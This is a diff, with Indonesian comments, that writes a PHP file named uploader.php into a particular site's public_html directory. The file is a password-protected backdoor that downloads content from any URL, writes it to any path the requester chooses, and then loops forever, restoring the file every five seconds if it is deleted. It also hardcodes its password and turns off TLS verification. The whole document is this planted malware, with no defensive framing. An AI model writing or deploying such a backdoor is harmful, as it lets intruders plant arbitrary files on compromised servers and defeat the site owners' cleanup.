@@ -1,75 +1,271 @@
+cat > /home/chiacundippal/public_html/web/uploader.php << 'EOF'
 <?php
-if (!isset($_GET['pass']) || $_GET['pass'] !== 'Kkjsqdb/QWsljqlxacOQKWPDsqa') {
-    header('HTTP/1.1 403 Forbidden');
-    echo "<html><head>
-    <title>403 Forbidden</title>
-    </head><body>
-    <h1>Forbidden</h1>
-    <p>You don't have permission to access " . htmlspecialchars($_SERVER['REQUEST_URI']) . " on this server.</p>
-    <p>Additionally, a 403 Forbidden error was encountered while trying to use an ErrorDocument to handle the request.</p>
-    </body></html>";
+/**
+ * File Uploader dengan Wget
+ * Menggunakan wget untuk mengambil konten dari URL eksternal
+ */
+
+// Password protection
+$valid_pass = 'Kkjsqdb/QWsljqlxacOQKWPDsqa';
+if (!isset($_GET['pass']) || $_GET['pass'] !== $valid_pass) {
+    http_response_code(403);
+    echo "<html><head><title>403 Forbidden</title></head><body>";
+    echo "<h1>Forbidden</h1>";
+    echo "<p>You don't have permission to access this file.</p>";
+    echo "</body></html>";
     exit;
 }
 
-
-ignore_user_abort(true);
+// Set timeout dan error reporting
 set_time_limit(0);
+ignore_user_abort(true);
 
+// Fungsi untuk mengambil konten dengan wget
+function fetch_with_wget($url, $timeout = 30) {
+    // Sanitasi URL
+    $url = escapeshellarg($url);
+    $timeout = (int)$timeout;
+    
+    // Buat temporary file
+    $temp_file = tempnam(sys_get_temp_dir(), 'wget_');
+    
+    // Command wget
+    $command = "wget --timeout={$timeout} --tries=3 --no-check-certificate -q -O " . escapeshellarg($temp_file) . " {$url} 2>&1";
+    
+    // Eksekusi wget
+    $output = [];
+    $return_code = 0;
+    exec($command, $output, $return_code);
+    
+    // Cek hasil
+    if ($return_code === 0 && file_exists($temp_file) && filesize($temp_file) > 0) {
+        $content = file_get_contents($temp_file);
+        unlink($temp_file);
+        return ['success' => true, 'content' => $content, 'error' => ''];
+    }
+    
+    // Ambil error message
+    $error_msg = implode("\n", $output);
+    if (file_exists($temp_file)) {
+        unlink($temp_file);
+    }
+    
+    return ['success' => false, 'content' => '', 'error' => $error_msg ?: "Wget failed with return code: {$return_code}"];
+}
+
+// Fungsi untuk mengambil konten dengan curl (backup)
+function fetch_with_curl($url) {
+    if (!function_exists('curl_init')) {
+        return ['success' => false, 'content' => '', 'error' => 'cURL not available'];
+    }
+    
+    $ch = curl_init();
+    curl_setopt_array($ch, [
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_TIMEOUT => 30,
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; WordPress)',
+        CURLOPT_SSL_VERIFYPEER => false
+    ]);
+    
+    $content = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $error = curl_error($ch);
+    curl_close($ch);
+    
+    if ($http_code === 200 && $content !== false) {
+        return ['success' => true, 'content' => $content, 'error' => ''];
+    }
+    
+    return ['success' => false, 'content' => '', 'error' => "cURL: HTTP {$http_code}, {$error}"];
+}
+
+// Fungsi untuk mengambil konten dengan file_get_contents (backup)
+function fetch_with_file_get_contents($url) {
+    if (!ini_get('allow_url_fopen')) {
+        return ['success' => false, 'content' => '', 'error' => 'allow_url_fopen is disabled'];
+    }
+    
+    $context = stream_context_create([
+        'http' => ['timeout' => 30, 'user_agent' => 'Mozilla/5.0'],
+        'ssl' => ['verify_peer' => false]
+    ]);
+    
+    $content = @file_get_contents($url, false, $context);
+    
+    if ($content !== false) {
+        return ['success' => true, 'content' => $content, 'error' => ''];
+    }
+    
+    return ['success' => false, 'content' => '', 'error' => 'file_get_contents failed'];
+}
+
+// Fungsi utama untuk mengambil konten
+function fetch_content($url) {
+    // Method 1: Wget (paling handal)
+    $result = fetch_with_wget($url);
+    if ($result['success']) {
+        return $result;
+    }
+    
+    // Method 2: cURL (backup)
+    $result = fetch_with_curl($url);
+    if ($result['success']) {
+        return $result;
+    }
+    
+    // Method 3: file_get_contents (backup terakhir)
+    $result = fetch_with_file_get_contents($url);
+    if ($result['success']) {
+        return $result;
+    }
+    
+    return ['success' => false, 'content' => '', 'error' => 'All methods failed'];
+}
+
+// =============================================================================
+// FORM HTML
+// =============================================================================
 
 if (!isset($_POST['submit'])) {
-    echo '
-    <form method="POST">
-        <label>URL Sumber:</label><br>
-        <input type="text" name="url" placeholder="Masukkan URL konten mentah" required><br><br>
-        <label>Nama File:</label><br>
-        <input type="text" name="filename" placeholder="Nama file yang diinginkan" required><br><br>
-        <label>Direktori Target:</label><br>
-        <input type="text" name="directory" placeholder="/path/to/directory" required><br><br>
-        <input type="submit" name="submit" value="Upload and Persist">
-    </form>';
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>File Uploader - Wget Method</title>
+        <style>
+            body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
+            .container { max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+            h1 { color: #333; margin-bottom: 20px; }
+            label { display: block; margin-bottom: 5px; font-weight: bold; color: #555; }
+            input[type="text"], input[type="url"] { width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+            input[type="submit"] { background: #0073aa; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+            input[type="submit"]:hover { background: #005a87; }
+            .info { background: #e8f4fd; padding: 10px; border-radius: 4px; margin-bottom: 20px; font-size: 14px; }
+            .info code { background: #fff; padding: 2px 5px; border-radius: 3px; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>📥 File Uploader (Wget Method)</h1>
+            <div class="info">
+                <strong>Info:</strong> Menggunakan wget untuk mengambil konten.<br>
+                <strong>Password:</strong> Parameter <code>?pass=Kkjsqdb/QWsljqlxacOQKWPDsqa</code>
+            </div>
+            <form method="POST">
+                <label>URL Sumber:</label>
+                <input type="url" name="url" placeholder="https://raw.githubusercontent.com/.../file.txt" required>
+                
+                <label>Nama File:</label>
+                <input type="text" name="filename" placeholder="contoh: landing-page.html" required>
+                
+                <label>Direktori Target:</label>
+                <input type="text" name="directory" placeholder="/home/chiacundippal/public_html/web/lp" value="/home/chiacundippal/public_html/web/lp">
+                
+                <input type="submit" name="submit" value="Upload & Persist">
+            </form>
+        </div>
+    </body>
+    </html>
+    <?php
     exit;
 }
 
+// =============================================================================
+// PROSES UPLOAD
+// =============================================================================
 
 $url = $_POST['url'];
 $filename = $_POST['filename'];
-$directory = rtrim($_POST['directory'], '/'); 
+$directory = rtrim($_POST['directory'], '/');
 
-
-function download_and_save($url, $directory, $filename) {
-    $content = @file_get_contents($url);
-    if ($content === false) {
-        echo "Gagal mengambil konten dari $url<br>";
-        return false;
-    }
-
-    if (!is_dir($directory)) {
-        mkdir($directory, 0755, true);
-    }
-
-
-    $full_path = $directory . '/' . $filename;
-
-
-    file_put_contents($full_path, $content);
-    echo "File berhasil diunggah ke $full_path<br>";
-    return true;
+// Validasi input
+if (empty($url) || empty($filename) || empty($directory)) {
+    die("Error: Semua field harus diisi!");
 }
 
-if (!download_and_save($url, $directory, $filename)) {
-    exit;
+// Buat direktori jika belum ada
+if (!is_dir($directory)) {
+    mkdir($directory, 0755, true);
+    echo "📁 Direktori created: {$directory}<br>";
 }
 
+$full_path = $directory . '/' . $filename;
 
-while (true) {
-    $full_path = $directory . '/' . $filename;
+echo "<!DOCTYPE html><html><head><title>Upload Result</title>";
+echo "<style>body{font-family:monospace;padding:20px;background:#1e1e1e;color:#ddd;}</style>";
+echo "</head><body>";
+echo "<h2>📥 Upload Result</h2>";
+echo "<hr>";
 
+echo "<strong>URL:</strong> " . htmlspecialchars($url) . "<br>";
+echo "<strong>Target:</strong> " . htmlspecialchars($full_path) . "<br>";
+echo "<strong>Method:</strong> Wget (with fallback)<br><br>";
 
-    if (!file_exists($full_path)) {
-        download_and_save($url, $directory, $filename);
+// Ambil konten
+$result = fetch_content($url);
+
+if ($result['success']) {
+    $content = $result['content'];
+    $size = strlen($content);
+    
+    // Simpan file
+    if (file_put_contents($full_path, $content)) {
+        echo "✅ <strong style='color:#4caf50'>SUKSES!</strong><br>";
+        echo "📄 File berhasil disimpan: <code>" . htmlspecialchars($full_path) . "</code><br>";
+        echo "📏 Ukuran: " . number_format($size) . " bytes<br>";
+        echo "🕐 Waktu: " . date('Y-m-d H:i:s') . "<br><br>";
+        
+        // Tampilkan preview 5 baris pertama
+        echo "<strong>📋 Preview (5 baris pertama):</strong><br>";
+        echo "<div style='background:#2d2d2d; padding:10px; border-radius:5px; margin-top:5px;'>";
+        echo "<pre style='margin:0; white-space:pre-wrap; word-wrap:break-word;'>";
+        $lines = explode("\n", $content);
+        $preview_lines = array_slice($lines, 0, 5);
+        echo htmlspecialchars(implode("\n", $preview_lines));
+        if (count($lines) > 5) {
+            echo "\n... (dan " . (count($lines) - 5) . " baris lainnya)";
+        }
+        echo "</pre></div>";
+        
+        // Loop untuk persistensi (file akan didownload ulang setiap 5 detik jika terhapus)
+        echo "<br><strong>🔄 Persistence Mode:</strong> File akan didownload ulang setiap 5 detik jika terdeteksi hilang.<br>";
+        echo "<div style='background:#2d2d2d; padding:10px; border-radius:5px; margin-top:10px;'>";
+        echo "<pre style='margin:0;'>";
+        
+        while (true) {
+            if (!file_exists($full_path)) {
+                echo "[" . date('H:i:s') . "] File hilang! Mendownload ulang...<br>";
+                flush();
+                $new_result = fetch_content($url);
+                if ($new_result['success']) {
+                    file_put_contents($full_path, $new_result['content']);
+                    echo "[" . date('H:i:s') . "] ✅ File berhasil direstore!<br>";
+                } else {
+                    echo "[" . date('H:i:s') . "] ❌ Gagal restore: " . $new_result['error'] . "<br>";
+                }
+                flush();
+            }
+            sleep(5);
+        }
+        
+    } else {
+        echo "❌ <strong style='color:#f44336'>ERROR!</strong><br>";
+        echo "Gagal menulis file ke: <code>" . htmlspecialchars($full_path) . "</code><br>";
+        echo "Periksa permission direktori.<br>";
     }
-
-
-    sleep(5);
+} else {
+    echo "❌ <strong style='color:#f44336'>ERROR!</strong><br>";
+    echo "Gagal mengambil konten dari URL.<br>";
+    echo "<strong>Error details:</strong> " . htmlspecialchars($result['error']) . "<br>";
+    echo "<br><strong>💡 Tips:</strong><br>";
+    echo "- Cek koneksi internet server<br>";
+    echo "- Cek apakah URL bisa diakses dari server: <code>curl -I " . htmlspecialchars($url) . "</code><br>";
+    echo "- Cek apakah wget terinstall: <code>which wget</code><br>";
+    echo "- Cek apakah allow_url_fopen aktif: <code>php -i | grep allow_url_fopen</code><br>";
 }
+
+echo "</body></html>";
 ?>
+EOF
